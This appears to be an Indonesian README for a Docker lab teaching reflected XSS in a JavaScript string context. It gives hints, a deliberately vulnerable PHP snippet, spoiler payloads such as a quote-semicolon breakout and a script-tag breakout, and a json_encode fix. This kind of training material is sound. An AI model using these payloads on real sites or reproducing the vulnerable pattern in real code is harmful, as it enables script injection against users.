# JS String Context XSS Lab - Reflected XSS in JavaScript String (Easy)

## 📋 Deskripsi Lab

Selamat datang di **JS String Context XSS Lab**! Lab ini mensimulasikan sebuah aplikasi messaging yang memiliki kerentanan **Reflected Cross-Site Scripting (XSS)** melalui **JavaScript string context**.

Aplikasi "MessageBoard Pro" menampilkan input pengguna kembali di dalam **JavaScript string variable** tanpa sanitasi yang tepat untuk konteks JavaScript.

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan lab ini, Anda akan memahami:

- Konsep **Reflected XSS dalam JavaScript string context**
- Perbedaan antara injeksi di HTML body, attribute, dan JavaScript string
- Cara keluar dari string context dalam JavaScript
- Pentingnya **JavaScript encoding** (bukan HTML encoding saja)
- Teknik menggunakan `</script>` tag untuk escape

## 🚀 Cara Menjalankan Lab

### Menjalankan Lab Ini:

```bash
cd /home/labuser/tools/lab-xss
docker compose up js-string-context-lab -d
```

Lihat port yang digunakan:
```bash
docker port xss-lab-js-string-context
```

Akses aplikasi di browser: `http://localhost:<port>`

## 🛑 Cara Menghentikan Lab

```bash
docker compose down js-string-context-lab
```

## 🎮 Cara Bermain

1. Buka aplikasi di browser
2. Coba masukkan pesan sederhana
3. Perhatikan URL dan parameter yang digunakan
4. Analisis source code untuk menemukan titik injeksi
5. Pahami konteks injeksi (JavaScript string)
6. Buat payload XSS yang sesuai dengan JavaScript string context
7. Eksekusi payload untuk mendapatkan flag

## 💡 Hint (Tanpa Spoiler)

### Hint 1 - Parameter Discovery
Perhatikan URL saat Anda mengirim pesan. Parameter apa yang digunakan?

### Hint 2 - Context Analysis
Coba test dengan input: `hello` dan lakukan view-source. Cari baris yang mengandung input Anda dalam tag `<script>`.

### Hint 3 - String Context
Input Anda muncul dalam JavaScript string: `var userMessage = 'INPUT_ANDA';`

### Hint 4 - Breaking Out
Untuk mengeksekusi JavaScript, Anda harus keluar dari string. Bagaimana cara menutup single quote dalam JavaScript?

### Hint 5 - Script Tags
Setelah keluar dari string, Anda bisa menutup tag `<script>` dan membuat tag `<script>` baru.

### Hint 6 - Clue Tersembunyi
Refresh halaman beberapa kali untuk melihat petunjuk berbeda di source code.

## 📚 Konsep Teknis

### Apa itu JavaScript String Context?

JavaScript string context terjadi ketika input pengguna ditempatkan di dalam string JavaScript:

```javascript
var userInput = 'USER_INPUT_HERE';
```

### Mengapa Ini Berbeda?

| Context | Contoh | Escape Method |
|---------|-------|---------------|
| HTML Body | `<div>INPUT</div>` | HTML encode |
| HTML Attribute | `<input value="INPUT">` | Attribute encode |
| **JavaScript String** | `var x = 'INPUT'` | **JavaScript encode** |

### Vector Serangan pada Lab Ini

```
GET /?message=<payload_js_string_xss>
```

Parameter `message` direfleksikan di dalam JavaScript string variable.

### Mengapa Ini Vulnerable?

```php
<!-- VULNERABLE CODE -->
<script>
var userMessage = '<?php echo $message; ?>';
</script>
```

Kode di atas langsung menampilkan input pengunakan tanpa JavaScript escaping. Input bisa keluar dari string dan menyisipkan kode JavaScript berbahaya.

## 🔒 Solusi (Spoiler Warning!)

<details>
<summary>Klik untuk melihat solusi</summary>

### Payload Dasar untuk JavaScript String XSS

```
?message='; alert(1); //
```

### Penjelasan Payload:

1. `'` - Menutup string single quote yang terbuka
2. `;` - Menutup statement JavaScript
3. `alert(1)` - Mengeksekusi kode JavaScript
4. `//` - Meng-komentari sisa string agar tidak error

### Hasil Rendering:

```javascript
var userMessage = ''; alert(1); //';
```

### Payload Alternatif (Script Tag Breakout)

```
?message='</script><script>alert(1)</script>
```

### Penjelasan:

1. `'` - Menutup string JavaScript
2. `</script>` - Menutup tag script yang ada
3. `<script>alert(1)</script>` - Membuat tag script baru

### Payload untuk Mendapatkan Flag

```
?message='; alert(flagData); //
```

Atau menggunakan fungsi validasi:

```
?message='; window.validateFlag(flagData); //
```

### Penjelasan Teknis

1. Input `message` direfleksikan dalam JavaScript string `var userMessage = '...'`
2. Payload `'` menutup single quote string
3. `;` mengakhiri statement variabel assignment
4. Kode JavaScript berikutnya dieksekusi sebagai kode yang valid
5. JavaScript mengakses variabel `flagData` yang berisi flag

### Teknik Escape Lain:

- Double quote dalam single quote: `var x = 'don"t'` → `don"t`
- Backslash: `var x = 'test\\' + x` → `test\` + x
- Template literal: `` var x = `test` `` → beda dengan single/double quote

### Perbaikan yang Disarankan

```php
<!-- SECURE CODE -->
<script>
var userMessage = <?php echo json_encode($message); ?>;
</script>
```

`json_encode()` akan melakukan proper JavaScript escaping termasuk quotes dan special characters.

</details>

## 📊 Checklist Pengerjaan

- [ ] Menemukan parameter vulnerable
- [ ] Mengidentifikasi bahwa injeksi di JavaScript string
- [ ] Memahami cara keluar dari single-quote string
- [ ] Membuat payload XSS untuk JavaScript string context
- [ ] Mengeksekusi payload untuk mendapatkan flag
- [ ] Memahami perbedaan JavaScript vs HTML encoding

## ⚠️ Catatan Penting

- Lab ini untuk **pembelajaran dan simulasi legal** dalam lingkungan terkontrol
- Teknik yang dipelajari **jangan digunakan untuk tujuan ilegal**
- Fokus pada pemahaman konsep keamanan, bukan sekadar mendapatkan flag
- Dalam aplikasi nyata, selalu gunakan **proper context-aware encoding**

## 🔖 Level & Teknik

- **Level**: Easy
- **Teknik**: Reflected XSS via query parameter (JavaScript string context)
- **Konteks**: JavaScript string injection
- **Parameter**: `message`
- **Filter**: None (no CSP, no WAF, no input sanitization)

## 🔗 Perbedaan dengan Lab Lain

| Lab | Konteks Injeksi | Variable | Payload Contoh |
|-----|----------------|----------|----------------|
| Search Query Lab | HTML body | `q` | `<script>alert(1)</script>` |
| Attribute Lab | HTML attribute | `search` | `" onload="alert(1)` |
| **JS String Lab** | **JavaScript string** | `message` | `'; alert(1); //` |

## 📖 Referensi Tambahan

- [OWASP XSS Prevention - Rule #3](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - XSS in JavaScript string](https://portswigger.net/web-security/cross-site-scripting/contexts)
- [MDN - JSON.stringify() for escaping](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify)

---

**Author**: IDS – CyberSec Academy Lab Authoring Guideline
**Version**: 1.0
**Last Updated**: 2025
